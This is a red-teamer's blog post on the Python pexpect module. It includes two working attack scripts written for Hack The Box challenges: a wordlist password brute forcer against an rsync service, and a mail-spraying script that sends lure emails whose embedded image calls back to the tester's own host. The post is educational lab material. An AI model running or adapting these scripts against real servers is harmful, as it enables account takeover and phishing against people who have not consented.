---
layout: post
title: PExpect, the Forgotten Module
date: 2021-02-20 16:28 -0400
categories: [Python]
tags: [coding, pexpect, python]
---

The title may be a bit exaggerated, but to be perfectly honest I feel that PExpect, the Python version of standard old [Expect](https://en.wikipedia.org/wiki/Expect), is hardly ever mentioned in the many Infosec personalities I follow when they create an exploit or some sort of python script that interacts with a service or protocol. And that is a total shame, because pexpect is crazy powerful and probably one of the most useful modules I've ever come across. I do see some form of it used in specific exploits however, most notably within the [Pwntools](https://docs.pwntools.com/en/stable/) library. In fact, the syntax is pretty similar, albeit a bit more rudimentary. But PExpect has one big advantage that pwntools doesn't: you probably have it installed already in your default python environment. At least I do, and I'm running Ubuntu Desktop.

PExpect allows you to start up a process with arguments, read from it until a specific line is encountered *or expected*, and send additional arbitrary commands to the process based on its returned value. It's pretty neat! In a pragmatic sense, it can be useful for network engineering where you might have scripts that need to log into a console somewhere and interact with some sort of network device like a router or switch. But from my point of view, the red teamer, it can be used to interact with a non-standard service to issue an exploit or brute forcing mechanism. You can read [all the documetation for it](https://pexpect.readthedocs.io/en/stable/), so instead of duplicating effort I'll just show you the basics of what I use it for.

## Basics

First, to spawn a process, use this:

```python
p = pexpect.spawn("nc 10.20.30.40 25")
```

This starts the netcat binary which connects to a remote SMTP server. You can then send arbitrary data to it.

```python
p.sendline("HELO abc.com")
```

The "sendline()" function will take a string and send it with a newline separator appended to the end. If you don't want to send a newline or send it yourself, use send().

```python
p.send("Some data without a newline")
```

You can then have the program wait until an expected line is sent to the receive buffer:

```python
p.expect("250 debian")
```

The program will block until that exact string is sent to the receive buffer. You can specify multiple possibilities by sending them as a list:

```python
result = p.expect(["250 debian", "Error"])
```

In this way, the variable "result" will contain the index of which expect possibility that it hit. For example, if the "Error" string is hit, the "result" variable will contain the value of 1. If "250 debian" is hit, result will be 0. You can tie this into an if statement:

```python
if result == 1:
    print("Program hit an error!")
else:
    print("We got what we expected!")
```

You can also specify an EOF or a Timeout, similarly -- if the spawned process hits a timeout or the connection is severed:

```python
result = p.expect(["250 debian", "Error", pexpect.EOF, pexpect.TIMEOUT])
```

## Okay. So what?

PExpect has so many possibilities. I've found a lot of success in attempting to write brute-forcer scripts for non-standard protocols. Only after searching did I discover an `rsync` brute forcer script written for nmap (Credit to [Hacktricks](https://book.hacktricks.xyz/brute-force) for that neat one), but when I wrote this for the `Zetta` challenge on Hack The Box, I couldn't find anything to use for it. That said, this is the brute force script I wrote for rsync that connected to a machine via IPv6!

```python
#!/usr/bin/env python3

"""
    This script will attempt to brute force an rsync server
    listening on ipv6. This ordinarily wouldn't work but since
    there isn't any weird timeout issue I'm going to go ahead
    and just brute force the command itself.
"""

import pexpect
import sys

cmd = "rsync -avs rsync://roy@[dead:beef::250:56ff:feb9:7cc4]:8730/home_roy ."
prompt = "Password: "
error = "auth failed"
pass_list = "./passwords.txt"

def try_pass(password):
    """
    This will actually attempt to log in with the password.
    """
    attempt = pexpect.spawn(cmd)
    login = attempt.expect([prompt, pexpect.EOF, pexpect.TIMEOUT])
    if login == 0:
        attempt.sendline(password)
        result = attempt.expect([error, pexpect.EOF, pexpect.TIMEOUT])

        if result == 0:
            return False
        elif result == 1:
            return True
        elif result == 2:
            raise Exception("Timeout")
        else:
            return True
    else:
        raise Exception("EOF or Timeout, machine unreachable?")

def main():
    with open(pass_list, "rb") as f:
        passwords = f.read().splitlines()

    for passw in passwords:
        # need this for rockyou encoding
        this_pass = passw.decode('utf-8')
        sys.stdout.write(f"\rTrying:" + " "*40)
        sys.stdout.write(f"\rTrying: {this_pass}")
        sys.stdout.flush()
        if try_pass(this_pass):
            sys.stdout.write(" "*60)
            sys.stdout.write(f"\rFound! {this_pass}\n")
            break

if __name__ == "__main__":
    main()

```

As you can see, it tries to log in with the one user `roy` and uses every single password in my password list. I believe here I just used `rockyou.txt` but perhaps a more conservative approach would be to collect words from the server with CeWL...but I digress.

Similarly, I also used PExpect to write a mail bomb script for the SneakyMailer challenge box on Hack The Box as well. Ippsec used [SWAKS](http://www.jetmore.org/john/code/swaks/) to do the same thing, and that was probably the better option, but I couldn't resist writing my own mailbomber. I explained [how to do this in Bash](/cheatsheets/advbash), but admittedly this is probably the better way since it doesn't just dump a ton of commands onto the service without waiting for a response. This way it actually waits until it receives a specific line before sending a new directive:

```python
#!/usr/bin/env python3

import pexpect

cmd = "nc 10.10.10.197 25"

# Here is a bunch of statements we can expect from the remote mail server
rec_initialize = "250 debian"
rec_mailfrom = "250 2.1.0 Ok"
rec_mailto = "250 2.1.5 Ok"
rec_mailto_bounce = "Recipient address rejected"
rec_rset = "250 2.0.0 Ok"
rec_data = "354 End data with <CR><LF>.<CR><LF>"
rec_mailok = "250 2.0.0 Ok: queued"

# My list of potential users
with open("./myusers.txt", "r") as f:
    userslist = f.read().splitlines()

# The email contents, don't judge me
payload = """OPEN THIS IMAGE, PLS
<img src="http://10.10.14.15/hifriend.gif">

That's it, thanks."""


def email_spam(userlist, p):
    """
        Will take p as the spawned pexpect object and simply
        loop through the user list and send the email looking
        for potential users.

        It is assumed we are ready to send email at this point
    """
    for user in userlist:
        p.sendline("MAIL FROM: agr0@hi.com")
        p.expect(rec_mailfrom)
        p.sendline(f"RCPT TO: {user}@sneakymailer.htb")
        mailto_res = p.expect([rec_mailto, rec_mailto_bounce])
        if mailto_res == 1:
            print(f"Unknown user: {user}! Skipping...")
            p.sendline("RSET")
            p.expect(rec_rset)
            continue

        print(f"Sending mail to {user}@sneakymailer.htb...")
        p.sendline("DATA")
        p.expect(rec_data)
        p.sendline(payload)
        p.sendline(".")
        p.expect(rec_mailok)
        print("Mail sent!")


def main():
    # Setting it up
    print("Starting up mailsprayer...")

    # Don't bug me with your verbose output
    p = pexpect.spawn(cmd, echo=False)
    p.sendline("HELO blah.com")
    p.expect(rec_initialize)
    print("Opening up the firehose!")
    email_spam(userslist, p)


if __name__ == "__main__":
    main()

```

I can't *not* add my own flair to my code. Sorry not sorry. But you see that I'm spawning a netcat process to connect to the remote mail server on port 25 and executing the directives line by line to send mail. I even found out how to use the `RSET` directive to start a new mail without severing the TCP connection! See, hacking is all about learning new tricks.

## Conclusion

Pwntools has a very similar process interaction mechanism that I've seen a lot of people use instead for similar functionality. While that's totally fine and certainly gets the job done, I feel that using pwntools to accomplish what pexpect can do out of the box is the programming equivalent of hammering a nail to a wall with a sledgehammer.

But I'll get off my soapbox now.